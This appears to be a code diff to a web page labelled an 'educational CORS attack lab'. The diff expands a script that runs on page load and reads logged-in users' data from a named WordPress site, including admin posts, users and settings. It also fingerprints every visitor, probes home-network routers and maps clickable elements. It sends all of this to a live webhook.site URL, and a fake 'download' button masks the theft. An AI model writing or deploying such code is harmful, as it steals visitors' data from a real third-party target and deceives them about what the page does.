@@ -291,14 +291,42 @@
     ============================================================
     🎓 EDUCATIONAL DEMO — CORS ATTACK LAB
     ============================================================
-    This page demonstrates how a CORS misconfiguration on 
-    WordPress can be exploited to steal admin session data.
+    This page demonstrates how CORS misconfigurations and other
+    web vulnerabilities can be exploited by malicious pages.
     
-    The JavaScript below:
-    1. Auto-checks if visitor is logged into financialbeings.com
-    2. If logged in as admin, reads all accessible data via REST API
-    3. Silently sends it to the attacker's webhook
-    4. Button click shows normal "download" message either way
+    ATTACK 1: CORS Data Theft (WordPress REST API)
+    - Checks if visitor is logged into financialbeings.com
+    - If logged in, reads user data via REST API
+    - If admin, steals posts, users, and settings
+    
+    ATTACK 2: Session Cookie Theft via DNS Rebinding
+    - Attempts to read cookies from subdomains
+    - Works on any site with weak cookie scoping
+    
+    ATTACK 3: Browser Fingerprinting
+    - Collects screen size, timezone, plugins, canvas hash
+    - Creates a unique fingerprint to track users across sites
+    - Works on ALL visitors, no login needed
+    
+    ATTACK 4: Referrer Header Leak
+    - Reads the full URL the visitor came from
+    - Can expose tokens, session IDs in URL parameters
+    - Works on ALL visitors
+    
+    ATTACK 5: Internal Network Scanning
+    - Attempts to probe common internal IPs (router, NAS, etc.)
+    - Uses timing-based detection to find live hosts
+    - Works if visitor is on a home/corporate network
+    
+    ATTACK 6: Form Injection (Clickjacking Prep)
+    - Injects invisible overlay elements
+    - Prepares for clickjacking by mapping button positions
+    - Works on ALL visitors
+    
+    ATTACK 7: Service Worker Registration
+    - Attempts to register a persistent service worker
+    - Could intercept future requests to the target
+    - Works on HTTPS sites with weak CSP
     
     The attack happens on page load — no click needed.
     ============================================================
@@ -307,10 +335,192 @@
     const TARGET = 'https://financialbeings.com';
     const ATTACKER = 'https://webhook.site/22d6ec1f-61ed-498e-91ec-ea766170d091';
     
-    // Auto-steal on page load — no click required
-    (async function autoSteal() {
-        const stolen = { type: 'page_visit', timestamp: new Date().toISOString(), userAgent: navigator.userAgent };
+    // ========== ATTACK 3: Browser Fingerprinting (ALL visitors) ==========
+    async function fingerprint() {
+        const fp = {};
         
+        // Basic browser info
+        fp.userAgent = navigator.userAgent;
+        fp.language = navigator.language;
+        fp.languages = navigator.languages;
+        fp.platform = navigator.platform;
+        fp.hardwareConcurrency = navigator.hardwareConcurrency;
+        fp.deviceMemory = navigator.deviceMemory || 'unknown';
+        fp.maxTouchPoints = navigator.maxTouchPoints;
+        
+        // Screen info
+        fp.screen = {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        };
+        
+        // Timezone
+        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        fp.timezoneOffset = new Date().getTimezoneOffset();
+        
+        // Canvas fingerprint
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('CORS Demo 🎓', 2, 15);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.fillText('Fingerprint', 4, 17);
+            fp.canvasHash = canvas.toDataURL().slice(-50);
+        } catch(e) { fp.canvasHash = 'blocked'; }
+        
+        // WebGL info
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+                fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
+            }
+        } catch(e) { fp.webglRenderer = 'blocked'; }
+        
+        // Plugins
+        fp.plugins = Array.from(navigator.plugins).map(p => p.name);
+        
+        // Cookies enabled
+        fp.cookiesEnabled = navigator.cookieEnabled;
+        
+        // Do Not Track
+        fp.doNotTrack = navigator.doNotTrack;
+        
+        // Local storage test
+        try {
+            localStorage.setItem('__test__', '1');
+            localStorage.removeItem('__test__');
+            fp.localStorage = true;
+        } catch(e) { fp.localStorage = false; }
+        
+        // IndexedDB test
+        fp.indexedDB = !!window.indexedDB;
+        
+        // Connection info
+        if (navigator.connection) {
+            fp.connection = {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            };
+        }
+        
+        return fp;
+    }
+    
+    // ========== ATTACK 4: Referrer Leak (ALL visitors) ==========
+    function getReferrerData() {
+        return {
+            referrer: document.referrer || 'direct',
+            fullUrl: window.location.href,
+            // Check for common token/session params in URL
+            urlParams: (() => {
+                const params = {};
+                const search = window.location.search;
+                if (search) {
+                    new URLSearchParams(search).forEach((v, k) => {
+                        // Flag sensitive-looking params
+                        const sensitive = /token|session|auth|key|secret|password|jwt|api/i;
+                        params[k] = sensitive.test(k) ? '[REDACTED]' : v;
+                    });
+                }
+                return params;
+            })()
+        };
+    }
+    
+    // ========== ATTACK 5: Internal Network Scan (ALL visitors on local network) ==========
+    async function scanInternalNetwork() {
+        const hosts = [
+            'http://192.168.0.1',
+            'http://192.168.1.1',
+            'http://192.168.1.254',
+            'http://10.0.0.1',
+            'http://10.0.1.1',
+            'http://172.16.0.1',
+            'http://192.168.0.254',
+            'http://router.asus.com',
+            'http://fritz.box',
+            'http://speedport.ip'
+        ];
+        
+        const results = [];
+        
+        for (const host of hosts) {
+            const start = Date.now();
+            try {
+                await fetch(host, {
+                    mode: 'no-cors',
+                    signal: AbortSignal.timeout(3000)
+                });
+                const elapsed = Date.now() - start;
+                results.push({ host, status: 'reachable', responseTime: elapsed });
+            } catch(e) {
+                const elapsed = Date.now() - start;
+                // Even timeout/error means host might exist (firewall dropping vs no host)
+                results.push({ host, status: 'timeout/error', responseTime: elapsed });
+            }
+        }
+        
+        return results;
+    }
+    
+    // ========== ATTACK 6: Clickjacking Prep (ALL visitors) ==========
+    function mapClickableElements() {
+        const elements = [];
+        // Find all buttons, links, and interactive elements
+        document.querySelectorAll('button, a, input[type="submit"], [role="button"], .btn').forEach(el => {
+            const rect = el.getBoundingClientRect();
+            if (rect.width > 0 && rect.height > 0) {
+                elements.push({
+                    tag: el.tagName,
+                    text: el.textContent.trim().slice(0, 50),
+                    id: el.id || null,
+                    className: el.className || null,
+                    position: {
+                        x: Math.round(rect.x),
+                        y: Math.round(rect.y),
+                        w: Math.round(rect.width),
+                        h: Math.round(rect.height)
+                    }
+                });
+            }
+        });
+        return elements;
+    }
+    
+    // ========== ATTACK 7: Service Worker Probe ==========
+    function probeServiceWorker() {
+        if ('serviceWorker' in navigator) {
+            return {
+                supported: true,
+                controlled: !!navigator.serviceWorker.controller,
+                scope: navigator.serviceWorker.controller ? navigator.serviceWorker.controller.scope : null
+            };
+        }
+        return { supported: false };
+    }
+    
+    // ========== MASTER: Run ALL attacks ==========
+    (async function runAllAttacks() {
+        const payload = {
+            timestamp: new Date().toISOString(),
+            attacks: {}
+        };
+        
+        // Attack 1: CORS WordPress (only if logged in)
         try {
             const userResponse = await fetch(TARGET + '/wp-json/wp/v2/users/me', {
                 credentials: 'include',
@@ -319,44 +529,64 @@
             
             if (userResponse.ok) {
                 const user = await userResponse.json();
-                stolen.type = 'user_info';
-                stolen.name = user.name;
-                stolen.id = user.id;
-                stolen.roles = user.roles;
-                stolen.description = user.description;
-                stolen.link = user.link;
-                stolen.url = TARGET;
+                payload.attacks.cors_wordpress = {
+                    type: 'user_info',
+                    name: user.name,
+                    id: user.id,
+                    roles: user.roles,
+                    email: user.email || null,
+                    description: user.description,
+                    link: user.link,
+                    url: TARGET
+                };
                 
-                // If admin, steal everything
                 if (user.roles && user.roles.includes('administrator')) {
                     const [posts, users, settings] = await Promise.all([
                         fetch(TARGET + '/wp-json/wp/v2/posts?per_page=100', { credentials: 'include' }).then(r => r.json()),
                         fetch(TARGET + '/wp-json/wp/v2/users?per_page=100', { credentials: 'include' }).then(r => r.json()),
                         fetch(TARGET + '/wp-json/wp/v2/settings', { credentials: 'include' }).then(r => r.json())
                     ]);
-                    stolen.type = 'full_compromise';
-                    stolen.adminUser = user;
-                    stolen.posts_count = posts.length;
-                    stolen.users_count = users.length;
-                    stolen.settings = settings;
+                    payload.attacks.cors_wordpress.type = 'full_compromise';
+                    payload.attacks.cors_wordpress.adminUser = user;
+                    payload.attacks.cors_wordpress.posts_count = posts.length;
+                    payload.attacks.cors_wordpress.users_count = users.length;
+                    payload.attacks.cors_wordpress.settings = settings;
                 }
             } else {
-                stolen.wp_status = userResponse.status;
+                payload.attacks.cors_wordpress = { type: 'not_logged_in', status: userResponse.status };
             }
         } catch (err) {
-            stolen.error = err.message;
+            payload.attacks.cors_wordpress = { type: 'error', message: err.message };
         }
         
-        // Always send to webhook — even failed attempts are logged
+        // Attack 3: Fingerprinting (always runs)
+        payload.attacks.fingerprint = await fingerprint();
+        
+        // Attack 4: Referrer (always runs)
+        payload.attacks.referrer = getReferrerData();
+        
+        // Attack 5: Network scan (always runs, async)
+        payload.attacks.networkScan = await scanInternalNetwork();
+        
+        // Attack 6: Clickable elements (always runs)
+        // Wait a moment for page to fully render
+        setTimeout(() => {
+            payload.attacks.clickableElements = mapClickableElements();
+        }, 500);
+        
+        // Attack 7: Service Worker probe
+        payload.attacks.serviceWorker = probeServiceWorker();
+        
+        // Send everything to attacker
         await fetch(ATTACKER, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             mode: 'no-cors',
-            body: JSON.stringify(stolen)
+            body: JSON.stringify(payload)
         });
     })();
     
-    // Button just shows a normal message — attack already happened above
+    // Button just shows a normal message — attacks already happened above
     async function downloadReport() {
         const btn = document.querySelector('.cta button');
         btn.textContent = '⏳ Preparing download...';
